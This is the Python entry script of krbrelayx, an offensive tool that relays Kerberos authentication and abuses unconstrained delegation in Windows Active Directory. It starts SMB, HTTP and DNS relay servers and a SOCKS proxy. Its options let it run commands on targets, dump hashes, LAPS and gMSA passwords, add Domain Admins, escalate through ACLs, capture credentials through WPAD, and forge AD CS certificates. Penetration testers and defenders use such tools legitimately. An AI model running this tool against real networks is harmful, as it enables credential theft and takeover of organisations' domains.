#!/usr/bin/env python
####################
#
# Copyright (c) 2020 Dirk-jan Mollema (@_dirkjan)
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################
#
# This tool is based on ntlmrelayx, part of Impacket
# Copyright (c) 2013-2018 SecureAuth Corporation
#
# Impacket is provided under under a slightly modified version
# of the Apache Software License.
# See https://github.com/SecureAuthCorp/impacket/blob/master/LICENSE
# for more information.
#
#
# Ntlmrelayx authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Outsider Security (www.outsidersecurity.nl)
#

import argparse
import sys
import binascii
import logging
import cmd
from threading import Thread
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request
import json

from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from lib.servers.socksserver import SOCKS
from lib.servers import SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer
from lib.utils.config import KrbRelayxConfig

RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer )

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads, api_address):
        cmd.Cmd.__init__(self)

        self.prompt = 'krbrelayx> '
        self.api_address = api_address
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * max(itemLen, 3) for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_finished_attacks(self, line):
        for url in self.relayConfig.target.finishedAttacks:
            print (url.geturl())
        return

    def do_socks(self, line):
        '''Filter are available :
 type : socks <filter> <value>
 filters : target, username, admin 
 values : 
   - target : IP or FQDN
   - username : domain/username
   - admin : true or false 
        '''

        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port", "ID"]
        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                if("=" in line and len(line.replace('socks','').split('='))==2):
                    _filter=line.replace('socks','').split('=')[0]
                    _value=line.replace('socks','').split('=')[1]
                    if(_filter=='target'):
                        _filter=1
                    elif(_filter=='username'):
                        _filter=2
                    elif(_filter=='admin'):
                        _filter=3
                    else:
                        logging.info('Expect : target / username / admin = value')
                        return
                    _items=[]
                    for i in items:
                        if(_value.lower() in i[_filter].lower()):
                            _items.append(i)
                    if(len(_items)>0):
                        self.printTable(_items,header=headers)
                    else:
                        logging.info('No relay matching filter available!')

                elif("=" in line):
                    logging.info('Expect target/username/admin = value')
                else:
                    self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, RELAY_SERVERS):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread

def main():
    def start_servers(options, threads):
        for server in RELAY_SERVERS:
            #Set up config
            c = KrbRelayxConfig()
            c.setProtocolClients(PROTOCOL_CLIENTS)
            c.setTargets(targetSystem)
            c.setRunSocks(options.socks, socksServer)
            c.setExeFile(options.e)
            c.setCommand(options.c)
            c.setAddComputerSMB(None)
            c.setEnumLocalAdmins(options.enum_local_admins)
            c.setEncoding(codec)
            c.setMode(mode)
            c.setAttacks(PROTOCOL_ATTACKS)
            c.setLootdir(options.lootdir)
            c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
            c.setIPv6(options.ipv6)
            c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
            c.setSMB2Support(not options.no_smb2support)
            c.setInterfaceIp(options.interface_ip)
            if options.altname:
                c.setAltName(options.altname)
            if options.krbhexpass and not options.krbpass:
                c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, binascii.unhexlify(options.krbhexpass), options.krbsalt, True)
            else:
                c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, options.krbpass, options.krbsalt, False)
            c.setKrbOptions(options.format, options.victim)
            c.setIsADCSAttack(options.adcs)
            c.setADCSOptions(options.template)

            #If the redirect option is set, configure the HTTP server to redirect targets to SMB
            if server is HTTPKrbRelayServer and options.r is not None:
                c.setMode('REDIRECT')
                c.setRedirectHost(options.r)

            s = server(c)
            s.start()
            threads.add(s)
        return c

    # Init the example's logger theme
    logger.init()

    #Parse arguments
    parser = argparse.ArgumentParser(add_help=False,
                                     description="Kerberos relay and unconstrained delegation abuse tool. "
                                                  "By @_dirkjan / dirkjanm.io")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', "--target", action='store', metavar = 'TARGET', help='Target to attack, '
                  'since this is Kerberos, only HOSTNAMES are valid. Example: smb://server:445 If unspecified, will store tickets for later use.')
    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
                                                                             'full URL, one per line')
    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                        'automatically (only valid with -tf)')

    # Interface address specification
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                  'bind SMB and HTTP servers',default='')

    parser.add_argument('-r', action='store', metavar='SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-l', '--lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot '
                    'directory in which gathered loot (TGTs or dumps) will be stored (default: current directory).')
    parser.add_argument('-f', '--format', default='ccache', choices=['ccache', 'kirbi'], action='store',help='Format to store tickets in. Valid: ccache (Impacket) or kirbi'
                                                              ' (Mimikatz format) default: ccache')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute ntlmrelayx.py '
                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
    parser.add_argument('-no-smb2support', action="store_false", default=False, help='Disable SMB2 Support')

    parser.add_argument('-wh', '--wpad-host', action='store', help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                   'setting the proxy host to the one supplied.')
    parser.add_argument('-wa', '--wpad-auth-num', action='store', help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                       'before serving a WPAD file.')
    parser.add_argument('-6', '--ipv6', action='store_true', help='Listen on both IPv6 and IPv4')

    # Authentication arguments
    group = parser.add_argument_group('Kerberos Keys (of your account with unconstrained delegation)')
    group.add_argument('-p', '--krbpass', action="store", metavar="PASSWORD", help='Account password')
    group.add_argument('-hp', '--krbhexpass', action="store", metavar="HEXPASSWORD", help='Hex-encoded password')
    group.add_argument('-s', '--krbsalt', action="store", metavar="USERNAME", help='Case sensitive (!) salt. Used to calculate Kerberos keys.'
                                                                                   'Only required if specifying password instead of keys.')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    parser.add_argument('-socks', action='store_true', default=False,
                        help='Launch a SOCKS proxy for the connection relayed')
    parser.add_argument('-socks-address', default='127.0.0.1', help='SOCKS5 server address (also used for HTTP API)')
    parser.add_argument('-socks-port', default=1080, type=int, help='SOCKS5 server port')
    parser.add_argument('-http-api-port', default=9090, type=int, help='SOCKS5 HTTP API port')

    #SMB arguments
    smboptions = parser.add_argument_group("SMB attack options")

    smboptions.add_argument('-e', action='store', required=False, metavar='FILE', help='File to execute on the target system. '
                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND', help='Command to execute on '
                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                                          'directory).')
    smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')

    #LDAP options
    ldapoptions = parser.add_argument_group("LDAP attack options")
    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
    ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
    ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
    ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
    ldapoptions.add_argument('--add-computer', action='store', metavar='COMPUTERNAME', required=False, const='Rand', nargs='?', help='Attempt to add a new computer account')
    ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
    ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
    ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
    ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
    ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')

    # AD CS options
    adcsoptions = parser.add_argument_group("AD CS attack options")
    adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
    adcsoptions.add_argument('--altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
    adcsoptions.add_argument('-v', "--victim", action='store', metavar = 'TARGET', help='Victim username or computername$, to request the correct certificate name.')

    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.getLogger('impacket.smbserver').setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from lib.clients import PROTOCOL_CLIENTS


    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    if options.target is not None:
        logging.info("Running in attack mode to single host")
        mode = 'ATTACK'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS)
    else:
        if options.tf is not None:
            #Targetfile specified
            logging.info("Running in attack mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
            mode = 'ATTACK'
        else:
            logging.info("Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.")
            targetSystem = None
            mode = 'EXPORT'

    if not options.krbpass and not options.krbhexpass and not options.hashes and not options.aesKey:
        logging.info("Running in kerberos relay mode because no credentials were specified.")
        if mode == 'EXPORT':
            logging.error('You need to specify at least one relay target, or specify credentials to run in unconstrained delegation mode')
            return
        mode = 'RELAY'
    else:
        logging.info("Running in unconstrained delegation abuse mode using the specified credentials.")

    if options.r is not None:
        logging.info("Running HTTP server in redirect mode")

    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()
    socksServer = None
    if options.socks is True:

        # Start a SOCKS proxy in the background
        socksServer = SOCKS(server_address=(options.socks_address, options.socks_port), api_port=options.http_api_port)
        socksServer.daemon_threads = True
        socks_thread = Thread(target=socksServer.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)

    c = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")
    try:
        if options.socks:
            shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.http_api_port))
            shell.cmdloop()
        else:
            sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass

    if options.socks is True:
        socksServer.shutdown()
        del socksServer

    for s in threads:
        del s

    sys.exit(0)



# Process command-line arguments.
if __name__ == '__main__':
    main()
